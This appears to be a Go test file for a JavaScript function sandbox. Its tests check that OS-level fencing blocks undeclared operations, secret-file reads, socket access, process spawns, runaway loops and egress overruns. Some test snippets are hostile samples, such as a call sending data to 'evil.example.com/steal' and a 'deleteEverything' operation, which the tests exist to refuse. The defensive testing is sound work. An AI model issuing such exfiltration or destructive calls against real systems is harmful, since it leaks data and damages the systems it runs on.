package sandbox

import (
	"context"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

// buildHelper compiles cmd/niuniu-funcbox once per test binary and points the
// sandbox package at it, so the tests exercise the REAL fence end to end
// instead of a stub.
//
// The binary lives in a process-scoped temp dir rather than t.TempDir(): the
// latter is removed when the test that created it finishes, which would delete
// the helper out from under every later test.
var (
	helperOnce sync.Once
	helperBin  string
	helperErr  error
	helperDir  string
)

func TestMain(m *testing.M) {
	code := m.Run()
	if helperDir != "" {
		_ = os.RemoveAll(helperDir)
	}
	os.Exit(code)
}

func testHelper(t *testing.T) string {
	t.Helper()
	helperOnce.Do(func() {
		dir, err := os.MkdirTemp("", "funcbox-test")
		if err != nil {
			helperErr = err
			return
		}
		helperDir = dir
		name := "niuniu-funcbox"
		if runtime.GOOS == "windows" {
			name += ".exe"
		}
		out := filepath.Join(dir, name)
		cmd := exec.Command("go", "build", "-o", out, "./cmd/niuniu-funcbox")
		cmd.Dir = filepath.Join("..", "..")
		if b, err := cmd.CombinedOutput(); err != nil {
			helperErr = err
			t.Logf("building helper: %v\n%s", err, b)
			return
		}
		helperBin = out
	})
	if helperErr != nil {
		t.Fatalf("build helper: %v", helperErr)
	}
	SetHelperPath(helperBin)
	return helperBin
}

func echoEgress(_ context.Context, req *HTTPRequestMessage) *HTTPResponseMessage {
	return &HTTPResponseMessage{
		OK:     true,
		Status: 200,
		Body:   []byte(`{"id":"42","state":"cancelled","path":"` + req.Operation + `"}`),
	}
}

func TestSelfCheckReportsComponents(t *testing.T) {
	testHelper(t)
	av := SelfCheck(true)
	if len(av.Components) == 0 {
		t.Fatal("self-check reported no components")
	}
	for _, c := range av.Components {
		t.Logf("component %-22s required=%-5v ok=%-5v %s", c.Name, c.Required, c.OK, c.Detail)
	}
	if !av.Available {
		t.Fatalf("fence unavailable on %s: %s", av.Platform, av.Reason)
	}
}

func TestRunFunctionOverFencedProcess(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name: "cancelOrder",
		Code: `function main(input) {
			const res = http_request({operation: "cancelOrder", params: {id: input.id}});
			console.log("called cancelOrder");
			return {ok: res.ok, status: res.status, state: res.body.state};
		}`,
		Egress: []EgressOp{{Operation: "cancelOrder", ReadOnly: false,
			Sample: map[string]any{"id": "42"}}},
	}
	res := Run(context.Background(), RunRequest{
		Spec:   spec,
		Input:  map[string]any{"id": "42"},
		Egress: echoEgress,
	})
	if !res.OK {
		t.Fatalf("run failed: %v (stderr=%q exit=%d)", res.Error, res.StderrTail, res.ExitCode)
	}
	out, _ := res.Output.(map[string]any)
	if out["state"] != "cancelled" {
		t.Fatalf("unexpected output: %#v", res.Output)
	}
	if res.EgressCalls != 1 {
		t.Fatalf("expected 1 egress call, got %d", res.EgressCalls)
	}
	if len(res.Logs) == 0 || !strings.Contains(res.Logs[0], "cancelOrder") {
		t.Fatalf("expected console output to be captured, got %#v", res.Logs)
	}
	t.Logf("backend=%s duration=%dms peak_mem=%d", res.FenceBackend, res.DurationMS, res.PeakMemoryBytes)
}

func TestUndeclaredOperationIsRefused(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name: "sneaky",
		Code: `function main() {
			const res = http_request({operation: "deleteEverything"});
			return {ok: res.ok, error: res.error};
		}`,
		Egress: []EgressOp{{Operation: "cancelOrder"}},
	}
	res := Run(context.Background(), RunRequest{Spec: spec, Input: map[string]any{}, Egress: echoEgress})
	if !res.OK {
		t.Fatalf("run failed: %v", res.Error)
	}
	out, _ := res.Output.(map[string]any)
	if out["ok"] != false {
		t.Fatalf("an undeclared operation was allowed through: %#v", res.Output)
	}
	if !strings.Contains(out["error"].(string), "not authorized") {
		t.Fatalf("unexpected refusal message: %#v", out["error"])
	}
}

func TestURLIsNotExpressible(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name: "urlAttempt",
		Code: `function main() {
			const res = http_request({operation: "cancelOrder", url: "https://evil.example.com/steal"});
			return {ok: res.ok};
		}`,
		Egress: []EgressOp{{Operation: "cancelOrder"}},
	}
	res := Run(context.Background(), RunRequest{Spec: spec, Input: map[string]any{}, Egress: echoEgress})
	if res.OK {
		t.Fatal("a caller-supplied URL was accepted")
	}
	if res.Error == nil || res.Error.Code != ErrRuntime {
		t.Fatalf("expected a runtime error, got %#v", res.Error)
	}
	if !strings.Contains(res.Error.Message, "unknown option") {
		t.Fatalf("unexpected error: %s", res.Error.Message)
	}
}

func TestRunawayLoopIsInterrupted(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name:   "spin",
		Code:   `function main() { let i = 0; while (true) { i = i + 1; } return i; }`,
		Egress: []EgressOp{{Operation: "noop"}},
		Limits: Limits{TimeoutMS: 1500},
	}
	started := time.Now()
	res := Run(context.Background(), RunRequest{Spec: spec, Input: map[string]any{}})
	elapsed := time.Since(started)
	if res.OK {
		t.Fatal("a runaway loop completed successfully")
	}
	if res.Error == nil {
		t.Fatal("expected a structured error")
	}
	if res.Error.Code != ErrTimeout && res.Error.Code != ErrKilled {
		t.Fatalf("expected a timeout/kill, got %s: %s", res.Error.Code, res.Error.Message)
	}
	if elapsed > 15*time.Second {
		t.Fatalf("the box was not reaped promptly: %s", elapsed)
	}
	t.Logf("killed after %s with code=%s killed=%v", elapsed, res.Error.Code, res.Killed)
}

func TestEgressBudgetIsEnforced(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name: "greedy",
		Code: `function main() {
			let last = null;
			for (let i = 0; i < 10; i++) { last = http_request({operation: "op"}); }
			return {last: last};
		}`,
		Egress: []EgressOp{{Operation: "op"}},
		Limits: Limits{MaxEgress: 3},
	}
	res := Run(context.Background(), RunRequest{Spec: spec, Input: map[string]any{}, Egress: echoEgress})
	if !res.OK {
		t.Fatalf("run failed: %v", res.Error)
	}
	if res.EgressCalls != 3 {
		t.Fatalf("expected the budget to cap egress at 3, got %d", res.EgressCalls)
	}
}

func TestSpawnRefusedWhenFenceUnavailable(t *testing.T) {
	// A spec whose runtime is unimplemented must fail at validation, which is
	// the same gate a host without a usable fence hits.
	res := Run(context.Background(), RunRequest{
		Spec: Spec{Name: "x", Runtime: RuntimeNode, Code: "function main(){}",
			Egress: []EgressOp{{Operation: "op"}}},
	})
	if res.Error == nil || res.Error.Code != ErrLintFailed {
		t.Fatalf("expected a validation failure, got %#v", res.Error)
	}
}

// ApplySelfFence is applied by the BOX on boot, never by the server. Calling it
// in the test process would be destructive on Linux (Landlock + seccomp are
// irreversible for the process) and would arm a CPU rlimit on macOS, so the
// assertion runs it where it actually runs: in a spawned box. The `--probe`
// self-check below is that run.
func TestApplySelfFenceIsExercisedByTheProbe(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("on Windows the fence is applied by the parent, so the box has nothing to self-apply")
	}
	testHelper(t)
	p, err := currentFence().Spawn(SpawnRequest{
		Path: HelperPath(), Args: []string{"--probe"},
		Env: boxEnv(), Dir: boxWorkDir(), MemoryBytes: 64 << 20,
	})
	if err != nil {
		t.Fatalf("spawn: %v", err)
	}
	defer func() {
		_ = p.Kill()
		p.Close()
	}()
	_ = p.Stdin().Close()
	if err := p.Wait(); err != nil {
		t.Fatalf("a box that self-fenced exited abnormally: %v", err)
	}
	_ = os.Getpid()
}

// TestFenceDeniesReadSocketAndSpawn is the OS-level isolation acceptance for
// #739. The attempts are made from Go inside the box, so a pass means the
// OPERATING SYSTEM refused them — not merely that the JS runtime lacks the API.
func TestFenceDeniesReadSocketAndSpawn(t *testing.T) {
	testHelper(t)

	// A file the current user can read but the box must not.
	secretDir, err := os.MkdirTemp("", "funcbox-secret")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(secretDir)
	secret := filepath.Join(secretDir, "secret.txt")
	if err := os.WriteFile(secret, []byte("top-secret-value"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := os.ReadFile(secret); err != nil {
		t.Fatalf("the test cannot read its own probe file: %v", err)
	}

	// A socket the current user can reach but the box must not.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			_ = c.Close()
		}
	}()
	// Confirm the listener really is reachable from outside the box, so a
	// "connection refused" cannot be mistaken for a successful denial.
	if c, err := net.DialTimeout("tcp", ln.Addr().String(), 2*time.Second); err != nil {
		t.Fatalf("the test cannot reach its own probe listener: %v", err)
	} else {
		_ = c.Close()
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	rep, err := FenceSelfTest(ctx, secret, ln.Addr().String())
	if err != nil {
		t.Fatalf("fence self-test: %v", err)
	}
	for _, p := range rep.Probes {
		t.Logf("probe %-18s denied=%-5v %s", p.Name, p.Denied, p.Error)
	}
	if !rep.OK {
		t.Fatalf("the OS fence did not deny every escape attempt (backend=%s)", rep.Backend)
	}
}

// A box that dies mid-call — a crash, an OOM kill, an operator killing it —
// must surface as a structured failure and must NOT leave the supervisor
// waiting. The service keeps serving other calls, which is the "helper 崩溃
// 不拖垮主服务" half of the acceptance.
func TestBoxCrashDoesNotHangTheSupervisor(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name:   "crashy",
		Code:   `function main() { return http_request({operation: "op"}); }`,
		Egress: []EgressOp{{Operation: "op"}},
		Limits: Limits{TimeoutMS: 30_000},
	}
	started := time.Now()
	res := Run(context.Background(), RunRequest{
		Spec:  spec,
		Input: map[string]any{},
		Egress: func(ctx context.Context, _ *HTTPRequestMessage) *HTTPResponseMessage {
			// Kill the box from under the run, from the host side — the closest
			// thing to a segfault we can arrange portably.
			if pid, ok := BoxPID(ctx); ok {
				if p, err := os.FindProcess(pid); err == nil {
					_ = p.Kill()
				}
			}
			return &HTTPResponseMessage{OK: true, Status: 200, Body: []byte(`{}`)}
		},
	})
	elapsed := time.Since(started)
	if res.OK {
		t.Fatal("a run whose box was killed reported success")
	}
	if res.Error == nil {
		t.Fatal("a killed box produced no structured error")
	}
	if elapsed > 20*time.Second {
		t.Fatalf("the supervisor waited %s for a dead box", elapsed)
	}
	t.Logf("survived a killed box in %s: %s", elapsed, res.Error)
}

// After a crash the fence must still be usable: the next call gets a fresh box.
func TestRunnerRecoversAfterACrash(t *testing.T) {
	testHelper(t)
	spec := Spec{
		Name:   "ok",
		Code:   `function main() { const r = http_request({operation: "op"}); return {status: r.status}; }`,
		Egress: []EgressOp{{Operation: "op"}},
	}
	res := Run(context.Background(), RunRequest{Spec: spec, Input: map[string]any{}, Egress: echoEgress})
	if !res.OK {
		t.Fatalf("the supervisor did not recover: %v", res.Error)
	}
}

// The two verdicts must not be interchangeable: a missing OPTIONAL layer is a
// degraded but usable fence (Linux without user namespaces, which #739 allows),
// while a missing REQUIRED layer means no function may run at all. Collapsing
// them either way would let the box run with less protection than advertised,
// or refuse to run on hosts the spec says should work.
func TestVerdictSeparatesDegradedFromUnavailable(t *testing.T) {
	required := func(ok bool) ComponentStatus {
		return ComponentStatus{Name: "landlock", Required: true, OK: ok, Detail: "landlock ABI 3"}
	}
	optional := func(ok bool) ComponentStatus {
		return ComponentStatus{Name: "user-namespaces", Required: false, OK: ok, Detail: "sysctl says no"}
	}

	cases := []struct {
		name          string
		comps         []ComponentStatus
		wantAvailable bool
		wantDegraded  bool
	}{
		{"everything present", []ComponentStatus{required(true), optional(true)}, true, false},
		{"optional missing degrades but still runs", []ComponentStatus{required(true), optional(false)}, true, true},
		{"required missing refuses to run", []ComponentStatus{required(false), optional(true)}, false, false},
		{"required missing outranks the optional one", []ComponentStatus{required(false), optional(false)}, false, false},
		// Degraded is only meaningful when the fence is usable; an unavailable
		// fence must not also advertise itself as merely degraded.
		{"unavailable is not reported as degraded", []ComponentStatus{required(false), optional(false)}, false, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			av := verdictFrom("linux/amd64", "test", tc.comps)
			if av.Available != tc.wantAvailable {
				t.Errorf("Available = %v, want %v (reason %q)", av.Available, tc.wantAvailable, av.Reason)
			}
			if av.Degraded != tc.wantDegraded {
				t.Errorf("Degraded = %v, want %v", av.Degraded, tc.wantDegraded)
			}
			if !av.Available && av.Reason == "" {
				t.Error("an unavailable fence must carry a reason for the UI")
			}
			if av.Available && av.Reason != "" {
				t.Errorf("a usable fence should not carry a refusal reason, got %q", av.Reason)
			}
		})
	}
}
